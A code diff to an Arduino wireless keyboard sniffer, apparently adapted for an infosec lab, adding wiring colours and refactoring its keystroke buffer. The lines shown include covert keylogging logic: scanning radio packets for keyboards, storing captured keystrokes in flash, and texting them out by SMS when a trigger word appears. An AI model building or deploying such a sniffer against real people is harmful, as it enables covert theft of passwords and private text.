@@ -28,23 +28,6 @@
  - http://www.remote-exploit.org/articles/keykeriki_v2_0__8211_2_4ghz/
  - http://goodfet.sourceforge.net/clients/goodfetnrf/
  
- 
- 
- */
-
-/*
- 
-  Minor Modifications for SteelCity Infosec Labs - Brian W. Gray
- 
- -
- -
- -
- -
- -
- -
- 
- 
- 
  */
 
 /*
@@ -77,29 +60,58 @@ MAC = 0xA8EE9A90CDLL
     20: 09 98 16 01 5B 8A F9 DF 90 87 15 D2 AA 80 48 6A B2 54 D0 F7 
 
 
+/*
+
+Minor Modifications for SteelCity Infosec Labs - Brian W. Gray
+
+-
+-
+-
+-
+-
+-
+
+
+
+*/
 
 /* pins:
- nRF24L01+ radio:
- 1: (square): GND
- 2: (next row of 4): 3.3 VCC 
- 3: CE 9
- 4: CSN: 8
- 5: SCK: 13
- 6: MOSI 11
- 7: MISO: 12
- 8: IRQ: not used for our purposes
- 
- W25Q80BV flash:
- 1: CS: 10
- 2: DO: 12
- 3: WP: not used
- 4: GND: GND
- 5: DI: 11
- 6: CLK: 13
- 7: HOLD: not used
- 8: VCC: 3.3 VCC
- 
- */
+
+Colors for Lab:
+Arduino Mini
+
+vcc: Red
+gnd: Black
+08: White
+09: Green
+11: Yellow
+12: Blue
+13: Green + Stripe
+
+
+nRF24L01+ radio:
+1: (square): GND - Black
+2: (next row of 4): 3.3 VCC - Red
+3: CE 9 - Green
+4: CSN: 8 - White
+5: SCK: 13 - Green + Stripe
+6: MOSI 11 - Yellow
+7: MISO: 12 - Blue
+8: IRQ: not used for our purposes
+
+
+
+W25Q80BV flash:
+1: CS: 10
+2: DO: 12
+3: WP: not used
+4: GND: GND
+5: DI: 11
+6: CLK: 13
+7: HOLD: not used
+8: VCC: 3.3 VCC
+
+*/
 
 // should we run with a GSM FONA board attached?
 // if not, you can still retrieve keystrokes over a
@@ -205,7 +217,7 @@ char imei[15] = {
 //#define E_FIRST_RUN  0x07 // 1 byte 
 
 #ifdef FLASH
-#include "Adafruit_TinyFlash.h"
+#include <Adafruit_TinyFlash.h>
 
 // 256 bytes per page of flash
 #define FLASHPAGE 256
@@ -283,7 +295,9 @@ void push(uint8_t val)
 {
   stack[stackptr++] = val;
   if (stackptr > STACKLEN-1)
-    stackptr = 0;
+  {
+    clearStack();
+  }
 }
 
 // if you're looking at this, you found a secret function...
@@ -364,8 +378,10 @@ char gotKeystroke(uint8_t* p)
   // do we have a trigger word?
   for (uint8_t i = 0; i < TRIGGERS; i++)
     // we do!
-    if (strlen(triggers[i]) && strstr(stack, triggers[i]))
+    if (strstr(stack, triggers[i]) != NULL)
+    {
       sendSms(i);
+    }
 
   // store in flash for retrieval later
   storeKeystroke(letter);
@@ -382,7 +398,7 @@ void sendSms(uint8_t j)
 {
   pr("Found trigger word: ");
   Serial.println(j);
-#ifdef GSM_ENABLED
+#ifdef ENABLE_GSM
   pr("Sending SMS: ");
   Serial.println(stack);
 
@@ -393,7 +409,15 @@ void sendSms(uint8_t j)
 #endif
 
   // clear our array so we don't trigger again
-  memset(&stack, 0, STACKLEN);  
+  clearStack(); 
+}
+
+void clearStack()
+//clears the stack and resets the stackptr back to 0!
+{
+  memset(&stack, 0, sizeof(stack));
+  prl("STACK CLEARED");
+  stackptr = 0;
 }
 
 void sendKeystroke(char letter)
@@ -703,6 +727,7 @@ uint8_t n(uint8_t reg, uint8_t value)
 uint8_t n(uint8_t reg, const uint8_t* buf, uint8_t len)                                       
 {
   uint8_t status;
+
   csn(LOW);
   status = SPI.transfer( W_REGISTER | ( REGISTER_MASK & reg ) );
   while (len--)
@@ -843,7 +868,7 @@ void scan()
       {
         radio.read(&p, PKT_SIZE);
 
-        if (p[4] == 0xCD) // temporarily modified for testing via https://www.youtube.com/all_comments?v=WqkmGG0biXc
+        if (p[4] == 0xCD)
         {
           sp("Potential keyboard: ");
           for (int j = 0; j < 8; j++)
